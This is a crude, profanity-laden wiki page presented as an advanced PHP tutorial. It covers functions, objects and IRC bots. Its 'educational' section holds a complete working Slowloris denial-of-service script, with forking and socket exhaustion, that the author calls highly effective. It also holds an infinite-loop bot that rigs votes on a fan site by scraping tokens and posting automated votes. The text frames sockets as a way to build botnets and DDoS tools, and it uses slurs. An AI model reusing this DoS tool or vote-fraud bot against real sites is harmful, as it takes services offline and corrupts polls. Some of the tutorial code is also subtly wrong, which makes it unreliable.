+So, you've made it to PHP Advanced. Cool :). In this entry I'll be covering more advanced PHP Methods not mentioned in [[PHP_Tutorial]]. The bulk of this article corresponds to PHP5, and will not be going over deprecated functions as well as methods which were once used in PHP4. 
+
+===Things You Should Know===
+There is no definite way to do ANYTHING in PHP. The methods and or techniques in this article possess many variations. 
+<br />
+Here's an example.
+
+====Fetching a random value from an array====
+<br />
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+# First off, our array object we want to fetch stuff from.
+
+$a = array("Dicks", "Game", "Massive Cocks");
+
+# Let's start with the simplest way to do this...
+
+echo $a[array_rand($a)];
+
+# Obviously an easy way to do it.. But you can also do this...
+
+echo $a[rand(0, count($a))];
+
+# Or even...
+
+shuffle($a);
+echo $a[0];
+
+# OR EVEN!
+
+$c = 0; # a counter..
+foreach($a as $b)
+    $c++;
+echo $a[rand(0,$c)];
+</source>
+</div>
+Of course I'd never recommend doing the last method, but there's many ways to do many things in PHP. Just keep this in mind as you're reading this article. You'll probably find other ways of doing things that may be more to your liking :)
+= Functions =
+Imagine a functions as an intricate in => out machine.
+
+==== PHP's Built in Functions ====
+PHP has way too many built in functions for anyone to know what to do with. [http://www.php.net/manual/en/funcref.php FUCKING READ THIS BEFORE YOU GO FORWARD]
+
+==== User Defined Functions ====
+Let's start by making our own function..
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+# Oh shit, an hello world function!!!! 
+function Hello_World() {
+   echo "Hello World!"; 
+}
+# Alright, let's call it!
+Hello_World(); # OH SHIT! We've echoed Hello World! Awesome! 
+
+#Let's make a variation on this!
+
+function Hello_World_Two() {
+  return "Hello World!";
+}
+# Now instead of echoing Hello World! We're returning it.. Let me explain the differences...
+
+echo Hello_World(); # This will echo "Hello World!" but it's being echoed by the echo inside Hello_World() not the echo that we've just called
+# ^ here.
+
+echo Hello_World_Two(); # Okay! This time Hello_World_Two is returning "Hello World!" making the echo we've just called actually do something...
+
+# Let's now make a simple in => out machine.
+
+function IO_Machine($input) {
+     if($input == "") {
+         return "\$input is an empty string!";
+     }elseif(is_numeric($input)) {
+         return "Oh shit, $input is numeric!";
+     }else {
+         return "$input is boring...";
+     }
+}
+echo IO_Machine(5); # Will tell you the string is numeric.
+echo IO_Machine(''); # Will tell you it's empty.
+echo IO_Machine('Booring'); # Will tell you it's boring :3
+
+# Well. Okay, that function was pretty fucking boring... Let's do something interesting with a function and a loop, and some global variables!
+
+$counter = 0;
+
+function Name_Here() {
+   global $counter;
+   $counter++;
+   if($counter >= 100)
+     return false;
+   else
+     return true;
+}
+
+while(Name_Here()) {
+ echo "Oh god! Counter is $counter\n";
+}
+
+## Basically that will do..
+# "Oh god.. Counter is 1"
+# ...
+# "Oh god.. Counter is 99"
+# "Oh god.. Counter is 100"
+## and stop!
+
+# And for example purposes, let's do that without using a function..
+
+$counter = 0;
+
+while($counter <= 100) {
+   $counter++;
+   echo "Oh god! Counter is $counter\n";
+}
+?>
+</source>
+</div>
+
+==== Anonymous Functions ====
+Available since PHP 5.3.0, you can make anonymous functions. Let's make some anon functions!
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+$var = function($omg) {
+	return strrev($omg);
+};
+
+echo $var("Hey!");
+?>
+</source>
+</div>
+
+=== Object Oriented Programming ===
+Well, what is OOP? Basically.. it's an object, with a bunch of functions and variables that act in it's own little environment. [http://php.net/manual/en/language.oop5.php PHP 5 OOP]
+
+==== The Basics ====
+Let's dive in with our first object class.
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+class foo {
+   # this is foo.
+   var $bar = "Bar"; # This is a var $bar in Foo. $bar is localized to Foo. 
+}
+
+# Let's explain!
+echo $bar; #This will do absolutely nothing as $bar hasn't been defined in the global scope yet.
+
+$bar = "foo";
+
+echo $bar; #This will now echo "foo"
+
+$foo = new Foo; #Now we call the object!
+
+echo $foo->bar; # Now it'll echo Bar! regardless of what the global $bar is!
+
+$foo->bar = "I'm a new bar!";
+
+echo $foo->bar; # This will echo the value for Foo::Bar that we've just set.
+?>
+</source>
+</div>
+
+==== Functions in Objects ====
+This really tells you nothing. Let's make a function within Foo this time!
+
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+class foo {
+   var $bar = "Bar"; 
+   function OMGWhatIsBar() { # define Foo::OMGWhatISBar;
+      echo $this->bar;  # Using the variable $this (meaning the object itself) echo Foo::Bar!
+   }
+}
+
+$foo = new Foo;
+$foo->OMGWhatIsBar(); #Should echo "Bar"
+
+# Okay, that was easy.. But here's something to be aware of.
+
+$foo->OMGWhatIsBar; # WILL NOT WORK, as it's trying to refrence to the variable "$OMGWhatIsBar" rather than the function.
+?>
+</source>
+</div>
+
+==== DIFFERENT OBJECTS DO NOT SHARE VARIABLES ====
+This is something that idiots get confused often.. Hopefully this little piece of code will clear things up...
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+class Foo {
+   var $bar = "I am bar!";
+}
+
+# Let's make two variables and assign Foo to them!
+
+$foo1 = new Foo;
+$foo2 = new Foo;
+
+# What we've done here is create 2 variables using the class Foo. 
+# The important thing you must realize is that each foo has it's own variable scope now. Let me explain.
+
+echo $foo1->bar; # Will echo "I am bar!";
+$foo1->bar = "The Game";
+echo $foo1->bar; # Will echo "The Game";
+echo $foo2->bar; # Will echo "I am bar!";
+
+# I hope you understand this. Let's complicate things a bit. 
+
+$foo3 = $foo2; # Okay. Now we've made $foo3 refrence to $foo2. THIS DID NOT CREATE A NEW Foo! Let me explain.
+$foo2->bar = "I like dicks!";
+echo $foo2->bar; # Will echo "I like dicks!";
+echo $foo3->bar; # Will echo "I like dicks!";
+
+# It works in the reverse too!
+$foo3->bar = "mooncup is my bff 4 lyfee";
+echo $foo3->bar; # Will echo "mooncup is my bff 4 lyfee"
+echo $foo2->bar; # Will echo "mooncup is my bff 4 lyfee";
+
+# What happens if you assign $foo2 or $foo3 to something else..
+
+$foo3 = "Hey. I'm now a string.. not a reference to an object";
+
+# $foo2 will still remain itself.. 
+
+echo $foo2->bar; # Will echo "mooncup is my bff 4 lyfee";
+
+# Let's elaborate with a simple example...
+
+$foo3 = $foo2;
+
+$foo2 = "I'm also now a string...";
+
+echo $foo3->bar; # Will echo "mooncup is my bff 4 lyfee";
+
+# Although you've removed the original $foo2, the object still remains in tact as it's still being referenced by $foo3. 
+
+# Also $foo1->bar will still remain "The Game"
+
+?>
+</source>
+</div>
+Wait, but e.. this tells me NOTHING! Not yet it might. But just wait :)
+
+===Sockets===
+The bread and butter for an interesting PHP Script. You can make botnets or even simple DDOS scripts if you know how to utilize sockets properly. Let's dive in with an example... A simple IRC bot...
+
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?php
+# Let's start out by defining a few variables for our bot to use..
+$server = "irc.encyclopediadramatica.com";
+$port = 6667;
+$nick = "PHP_Adv_Test".rand(0,100); # Random numbers after the nickname to avoid nick collisions as this example won't include how to handle that.
+$ident = "Bots";
+$realname = "Test Bot";
+$channel = "#ed"; # This bot will only be joining one channel.
+
+
+# We'll be using fsockopen here, rather than the more complicated socket_create .. socket_bind .. socket_connect.
+$fp = fsockopen($server, $port); # We've established our connection..
+
+fwrite($fp, "NICK $nick\r\n"); # Telling the IRC our nickname..
+fwrite($fp, "USER $ident * * : $realname\r\n");
+
+# Okay, we've established an IRC connection.. Let's join a channel
+
+fwrite($fp, "JOIN $channel\r\n");
+
+# Now let's say something to alert our presence..
+
+fwrite($fp, "PRIVMSG $channel :Hey! I'm $nick I'm a worthless bot.\r\n");
+
+# And now we close the connection...
+fclose($fp);
+?>
+</source>
+</div>
+
+So this bot really does nothing, but it gives you a good grasp of how we're going to go about this. But before we continue, you're going to need to have a good grasp on Object Oriented programming. I for one, love it.
+
+=== Scripts for Educational Purposes ===
+These scripts are for strict educational purposes. Use at your own risk.
+
+==== Twetterwall Auto Voter ====
+Here's a non OOP code. Look at the sloppyness, yet again written by me. This one is to vote on that tweeterwall page.
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+/**
+ * @author e
+ */
+### WHO THE FUCK DO YOU WANT THIS FUCKING SCRIPT TO NOT VOTE FOR? ###
+$donotvote = "@mileycyrus @davedays @mileyrusfanclub @ddlovato @jonasbrothers @miley_fan_net 
+@canardpcredac @selenagomez @seiji092 @billyraycyrus @thebrandicyrus @mommytish 
+@respectmileyc @taylorswift13 @mandyyjirouxx @tracecyrus @ashika789 @davidefanmiley 
+@shanedawson @mileyfashion @wesupportniley @mileycyrusru @teamcyrus @mileyunlimited 
+@missnoiecyrus @mileys_lover @mileybrcom @believeinniley @mileycombr @weheartmileyc 
+@jb_cyrus_lovato @mileyc_rox @jb_x3 @buckhollywood @unitedformiley @siimplesongx @bts_niley 
+@mileycyrusbr @mileycyruschile @alwaysmileyus @mileyamazed @teammiley @jazjess 
+@xxteamdisneyxx @mileyforever969 @xmileysupport @justinmgaston @nickela_ @therealjordin 
+@henriquehora @lorano13 @gottaloveniley @gottaloveselena @teammcyrus @franniie23xo 
+@peaceformiley @missmileysfan1 @teammileycyrusx @demiley_twi12 @dedicatdtomiley";
+
+### URL OF THE PAGE WITH THE FUCKING PEOPLE THAT YOU WANT TO VOTE FOR ###
+$urlo = "http://tweeterwall.mallplace.com/tw/fan-series/miley-cyrus-fans";
+$a = $b = $to = $tr = 0;
+$banned = explode(" ",$donotvote);
+### I WOULDNT TOUCH THE SHIT BELOW HERE ###
+echo "  [ ! ] TweeterWall autovoter by e\n";
+echo "  [ ! ] irc.encyclopediadramatica.com #ed\n";
+echo "  [ ~ ] Starting Script!\n";
+ #okay, this is the start timer.. Just for stat purposes
+$basestart = time();
+
+# infinite loop.
+while(1) {
+if($tr == 0) {
+	# first time loop is being ran
+echo "  [ ! ] First run, the time is ".date('l jS \of F Y h:i:s A')."\n";
+} else {
+	# second + time script is being ran.. Logging and shit done here.
+echo "  [ ! ] Waking up! $tr run! the time is ".date('l jS \of F Y h:i:s A')."\n";
+}
+$tr++;
+# We calculate the next time, as they have a 20 minute timeout for each vote.
+$next = time() + (21*60);
+# When did we start?
+$started = time();
+# pages to vote on.
+$pgs = 32;
+# current page we're on
+$pxx = 0;
+# The for loop to vote for each page.
+for($px = $pxx; $px <= $pgs; $px++) {
+	if($px > 0) {
+		$url = $urlo."?page=".$px;
+	} else $url = $urlo;
+# verbose output
+echo "  [ ! ] Loading Page: $px/$pgs\n";
+echo "  [ ~ ] Fetching Token\n";
+# time for our curl!
+$ch = curl_init();
+# We'll put cookies in this text file.
+$cookies = "cookie.txt";
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$wall = curl_exec($ch);
+curl_close($ch);
+# unset to save memory.
+unset($ch);
+# run a regex match to find our token.
+preg_match('/id="edit-auto-submit-token" value="(.*?)"/', $wall, $tokens);
+if (!isset($tokens[1])) {
+	# something BAD HAPPENED.
+	echo "  [ x ] TOKEN NOT FOUND -- INVALID PAGE?? !!!\n";
+	echo "  [ x ] DIEING !!!\n";
+	unlink($cookies);
+	exit;
+}
+# Okay we've found our token.
+echo "  [ + ] Token Found: $tokens[1]\n";
+# regex to find our country  id,
+preg_match('/id="users-country" rel="([0-9]+)"/', $wall, $cid);
+echo "  [ ~ ] Fetching Country ID\n";
+if (!isset($cid[1])) {
+	# something BAD HAPPENED.
+	echo "  [ x ] COUNTRY ID NOT FOUND -- INVALID PAGE?? !!!\n";
+	echo "  [ x ] DIEING !!!\n";
+	unlink($cookies);
+	exit;
+}
+# array to store users to vote for.
+$z = array();
+
+echo "  [ + ] Country ID Found: $cid[1]\n";
+
+echo "  [ ~ ] Finding UIDs for all the people.\n";
+# run a regex to find all the users on that page.
+    preg_match_all('/title="@([A-z0-9_]+)"(.*?)id="twitter-pic([0-9]+)"/', $wall, $p);
+    $i=0;
+    foreach($p[1] as $x) {
+    	# Wait, are they banned? 
+	if(in_array("@".$x, $banned)) {
+	echo "  [ ^ ] @$x is on the banned list, and will not be voted for.\n";
+} else {
+	 #add them to the array that will vote for.
+    	$z['@'.$x] = $p[3][$i];
+    	echo "  [ % ] Found UID for @$x: ".$p[3][$i]."\n";
+    	   	$i++;
+}
+    }
+  # lets take a short nap
+sleep(1);
+$cz = count($z);
+if($cz == 0) {
+	#everyone was banned? or no one on that page
+echo "  [ x ] No one to vote for!\n";
+} else {
+	#lets start voting
+echo "  [ ~ ] Voting for ".$cz." people.\n";
+$oc = 1;
+# a foreach loop!
+foreach ($z as $y => $x) {
+    echo "  [ ~ ] ($oc/$cz)  ".round($oc/$cz*100)."%	[Voting]: $y\n";
+$oc++;
+# more curl shit
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://tweeterwall.mallplace.com/tw/vote");
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+    curl_setopt($ch, CURLOPT_REFERER, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, 
+'country_id='.$cid[1].'&token='.$tokens[1].'&uid='.$x);
+    $s = curl_exec($ch);
+    curl_close($ch);
+    unset($ch);
+    if ($js = json_decode($s, 1)) {
+        echo "  [ % ]             Vote on $y was successful!\n";
+        echo "  [ + ]                   $y is now at {$js['vote_count']} votes!\n";
+        $a++;
+    } else {
+        echo "  [ x ]             Failed to vote for $y!\n";
+        $b++;
+        }
+} ## THE GAME ##
+
+}
+$to = $cz + $to;
+unlink($cookies);
+}
+echo "  [ ! ] SO FAR! \n";
+echo "  [ % ]      Success: 		$a	".round($a/$to*100)."%\n";
+echo "  [ % ]      Failure: 		$b	".round($b/$to*100)."%\n";
+echo "  [ % ]      Total		$to \n";
+echo "  [ ! ] This script has been running since ".$basestart." and took 
+".(time()-$started)." seconds to upvote everyone.\n";
+echo "  [ z ] Going to sleep! I'll wake up in ".($next - time())." seconds!\n";
+sleep($next - time());
+}
+
+?>
+</source></div>
+
+==== Slowloris / eRiS ====
+Here's a slowloris script that I wrote. A great example of OOP. It's a bit sloppy, so read the comments.
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?php
+/**
+ * @author e
+ * @copyright 2009
+ * @dicks yes
+ * This is a Slowiris, written by e. Because, you are all ghey. 
+ * @usage php eris.php socknum connecttime sleep forks server
+ */
+
+# Alright, here we're calling the eris class defined below, taking in the global $argv to parse console commands.
+
+$eris = new eris($argv, true);
+
+# We start it. This just echos the text in eris::start(), nothing fancy :)
+$eris->start();
+
+# Okay, now we're going to fork processes
+for ($i = 0; $i < $argv[4]; $i++) {
+    # Fork, and assign the pid to $pid
+	$pid = pcntl_fork();
+    
+	if ($pid == -1) {
+    	# We'll get here if pcntl_fork failed.	
+        die("Dude, I can't fucking fork. FUCK!");
+    } else
+        if ($pid == 0) {
+        	# we are the fork, let's run!
+            $eris = new eris($argv, false);
+            $eris->start();
+            $eris->build();
+
+        } else {
+        	# we are the parent, we'll store all the PID's in an array
+            $pids[] = $pid;
+        }
+
+}
+$status = 0;
+# makes the parent wait for the children to run.
+foreach ($pids as $pid) {
+    pcntl_waitpid($pid, $status);
+}
+class eris
+{
+	# An array that will hold all our socket resources.
+    public $sockets = array();
+    public $argv, $greet, $socknum, $ip, $timeout, $ctimeout, $server;
+
+    # PHP5's magic constructor class. Gets called when the object is created using 'new'
+    function __construct($argv, $greet)
+    {
+        $this->argv = $argv;
+        $this->greet = $greet;
+    }
+    function start()
+    {
+    	# Alright, let's parse $argv and make sure everything is good.
+        $argv = $this->argv;
+        if (!isset($argv[1])) {
+        	# No args? Okay! Display this!
+            die("What? php eris.php socknum connecttime sleep forks server");
+        }
+        if ($argv[1] == "help") {
+        	# Well. If I ever wrote a help it'd be here
+            echo "Help goes here, HELP!";
+            exit();
+        }
+        	# basic checks
+        if (!is_numeric($argv[1]) || $argv[1] < 0)
+            die("Idiot. You can't have a negative number of sockets.");
+        if (!is_numeric($argv[2]) || $argv[2] < 0)
+            die("Idiot. You can't have a negative timeout.");
+        
+        	# this only gets called by the parent.
+        if ($this->greet == true) {
+
+            echo "[ % ]   Welcome to e's Slowris Script??!\n";
+            echo "[ % ]   Use at your own risk. Highly effective.\n";
+            echo "[ ! ]   Supplied Params:\n";
+            echo "[ + ]   Server:             $argv[5]\n";
+            echo "[ + ]   Connect-Timeout:    $argv[2]\n";
+            echo "[ + ]   Sleep:              $argv[3]\n";
+            echo "[ + ]   No. of Sockets:     $argv[1]\n";
+            $this->ip($argv[5]);
+            echo "[ % ]   Starting $argv[4] forks.. \n";
+            return;
+        } else {
+            sleep(2);
+        }
+        # just assigng some variables (only in child)
+        $this->socknum = $argv[1];
+        $this->server = $argv[5];
+        $this->ctimeout = $argv[2];
+        $this->timeout = $argv[3];
+        $this->ip = $this->ip($this->server);
+    }
+    ## resolves ip to speed up requests.
+    function ip($ip)
+    {
+        $ip = trim($ip);
+        $ntt = $ip;
+        $ip = gethostbyname($ntt);
+        if ($ip == $ntt) {
+            die("[ x ]   Could not find host..");
+        } else {
+            if ($this->greet == true) {
+                echo ("[ ! ]   " . ucwords($ntt) . " resolves to $ip\n[ + ]   Let's make some sockets!\n");
+            }
+            return ($ip);
+        }
+    }
+    ## sends the broken headers
+    function send_headers($fp, $key)
+    {
+        $request = "GET / HTTP/1.1\r\n";
+        $request .= "Host: $this->server\r\n";
+        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
+        $request .= "Content-Length: " . rand(1, 10000) . "\r\n"; ## NOTICE HOW THESE HEADERS ARE INCOMPLETE!
+        if (fwrite($fp, $request) === false) {
+            unset($this->sockets[$key]);
+            echo "Socket $key died.\n"; ## If the connection was closed by the host, this would happen.
+        }
+    }
+    ## this is the main loop. we do shit in here.
+    function main_loop()
+    {
+        while (1) {
+        	# Just a verbose message.
+            echo "[ % ]   Sending shit to " . count($this->sockets) . " sockets... \n";
+            # A timer, so we can see if their server is lagged yet.
+            $timer = microtime(true);
+            # A foreach loop, so that every socket is touched.
+            foreach ($this->sockets as $key => $s) {
+                if (!fwrite($s, "X-a: " . rand(1, 10000) . "\r\n") || !is_resource($s)) {
+                    # We get here if the socket has died, (remote host closed connection, pinged, broken pipes.. etc)
+					fclose($s);
+                    unset($this->sockets[$key]);
+                    echo "[ x ] Socket $key died!! Creating new socket... ";
+                    # Then we'll create a new socket in that one's place
+                    $timez = microtime(true);
+                    if (($fp = $this->create_socket($this->server, $this->ip, $key)) !== false) {
+                        $this->sockets[$key] = $fp;
+                        echo "took " . round((microtime(true) - $timez), 5) . " secs\n";
+                    } else {
+                        echo "timedout, failed.. etc will try again later.\n";
+                    }
+                }
+            }
+            # Okay, everything's sent.. verbosity output
+            echo "[ + ] Took " . round(microtime(true) - $timer, 5) . " seconds -- Zzzz for $this->timeout seconds.\n";
+            # now we sleep!
+				sleep($this->timeout);
+        }
+    }
+        ## makes socket
+        function create_socket($host, $ip, $i)
+        {
+        	# open socket.
+            $fp = @fsockopen($ip, 80, $e1, $this->e2, $this->ctimeout);
+            if (is_resource($fp)) {
+           	# send broken headers.
+                $this->send_headers($fp, $host, $i);
+                return $fp;
+            } else
+                return false;
+        }
+        ## main class
+        function begin_eris()
+        {
+            $timeout = 0;
+            # a timer for timing purposes.
+            $start = microtime(true);
+            # just to keep keys friendly.
+            $sc = 0;
+            # a for looop now :3
+            for ($i = 0; $i < $this->socknum; $i++) {
+            	# verbosity
+                echo "[ # ]   Building socket [" . ($i + 1) . "/$this->socknum " . (round($i / $this->
+                    socknum * 100)) . "%] ... ";
+                # individual socket timer.
+                $timer = microtime(true);
+                # creates sockets :)
+                if (($fp = $this->create_socket($this->server, $this->ip, $i)) !== false) {
+                    $this->sockets[$i] = $fp;
+                    echo "took " . round((microtime(true) - $timer), 5) . " secs\n";
+                    $sc++;
+                } else {
+                	# socket didn't work?
+                    echo "Error: $this->e2\n";
+                    $timeout++;
+                    if ($timeout > 5) {
+                    	# server seems to be choking, let's keep what we've got.
+                        echo "Fuck it. I'll just keep these connections alive\n";
+                        break;
+                    }
+                }
+            }
+            # more verbosity
+            echo "[ ! ]   Created $sc sockets in " . round((microtime(true) - $start), 5) .
+                " secs\n";
+        }
+         # and finaly this :)
+        function build()
+        {
+        	# just calls the 2 main functions.
+            $this->begin_eris();
+            $this->main_loop();
+        }
+    }
+
+?>
+</source>
+</div>
+
+==== PHP Socket Class ====
+I wrote this for LGN. Basically you have two classes, one for the socket_* and the other for fsock. Works good with a the next PHP bot script.
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+class zSocket
+{
+    var $fp = null; var $buff = 0;
+    function __construct($buff = 1024)
+    {
+        $this->buff = $buff;
+    }
+    function connect($host, $port)
+    {
+        $this->fp = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if (!$this->fp) {
+            echo "Failed to create socket...";
+            return false;
+        }
+        if (!($e = socket_connect($this->fp, $host, $port))) {
+            echo "Failed to connect socket...";
+            return false;
+        }
+        return true;
+    }
+    function write($msg)
+    {
+        return socket_write($this->fp, $msg, strlen($msg));
+    }
+    function read()
+    {
+        return trim(socket_read($this->fp, $this->buff));
+    }
+}
+class fSocket
+{
+    var $fp = null; var $buff = 0; var $timeout = 0;
+    function __construct($buff = 1024, $timeout = 5)
+    {
+        $this->buff = 1024;
+        $this->timeout = $timeout;
+    }
+    function connect($host, $port)
+    {
+        $this->fp = fsockopen($host, $port, $err, $ers, $this->timeout);
+        if (!is_resource($this->fp) || !$this->fp || feof($this->fp)) {
+            echo "Failed fsockopen [$err] $ers";
+            return false;
+        }
+        return true;
+    }
+    function write($msg)
+    {
+        return fwrite($this->fp, $msg, strlen($msg));
+    }
+    function read()
+    {
+        return trim(fgets($this->fp, $this->buff));
+    }
+}
+?>
+</source>
+</div>
+==== PHP IRC Bot Framework (OOP) ====
+Here's the OOP PHP Bot. It uses the socket class above.
+<div style="background-color: #fff; -moz-border-radius: 7px; -webkit-border-radius: 7px; border: 2px solid #000; padding: 10px;">
+<source lang="php">
+<?
+require('sockets.php');
+class php_bot
+{
+    var $host, $port, $chan, $nick, $ident, $socket = false, $sbool = false;
+    function __construct($host, $port, $chan, $nick = "Norton", $ident = "php")
+    {
+        $this->host = $host;
+        $this->port = $port;
+        $this->nick = $nick;
+        $this->ident = $ident;
+        $this->chan = $chan;
+        return $this->_try();
+    }
+    function _try()
+    {
+        if (!function_exists('fsockopen') || ini_get('allow_url_fopen') === 0) {
+            $this->socket = $this->sbool = true;
+	    echo "Failed the fsock/allow test\n";
+        } else {
+            $fp = fsockopen("www.google.com", 80);
+            if (!is_resource($fp)) {
+	      echo "Failed the google test\n";
+                $this->socket = $this->sbool = true;
+            } else {
+                fclose($fp);
+                $this->socket = $this->sbool = false;		
+		}			
+        }
+    }
+    function gecos() {
+    	return php_uname();
+    }
+    function g_nick() {
+    return $this->nick."-".rand(0,9999);
+    }
+    function irc_connect() {
+    	if($this->socket = true) {
+    		$this->socket = new zSocket();
+    	} else {
+    		$this->socket = new fSocket();
+    	}
+    	if($this->socket->connect($this->host, $this->port)) {
+    		$this->socket->write("NICK ". $this->g_nick(). "\r\n");
+    		$this->socket->write("USER ".$this->ident." \"\" \"\" : ".$this->gecos()."\r\n");
+    		$this->loop();
+    	} else die("FAILURE!");
+        $this->loop();
+    }
+    function join($chan) {
+    	return $this->socket->write("JOIN $chan\r\n");
+    }
+    function privmsg($chan, $msg) {
+    	return $this->socket->write("PRIVMSG $chan :$msg\r\n");
+    }
+    function loop() {
+	    $this->join($this->chan);
+    	while(($line = $this->socket->read())) {
+    		if(preg_match("/hello/", $line)) {
+	      $this->privmsg($this->chan, "hey!");
+	      }
+    	}
+    	echo "Dead...";
+    	sleep(2);
+    	$this->irc_connect();
+    	
+    }
+}
+$z = new php_bot("irc.encyclopediadramatica.com", 6667, "#ed", "wiki");
+$z->irc_connect();
+?>
+</source>
+</div>
+
+=Related Links=
+*[http://developers.slashdot.org/developers/06/07/28/0552240.shtml http://developers.slashdot.org/developers/06/07/28/0552240.shtml]
+*[http://developers.slashdot.org/comments.pl?sid=192445&cid=15797829 http://developers.slashdot.org/comments.pl?sid=192445&cid=15797829]
+*[http://lerdorf.com/rl.jpg http://lerdorf.com/rl.jpg] - Picture of Rasmus Lerdorf
+[[Category: Softwarez]]
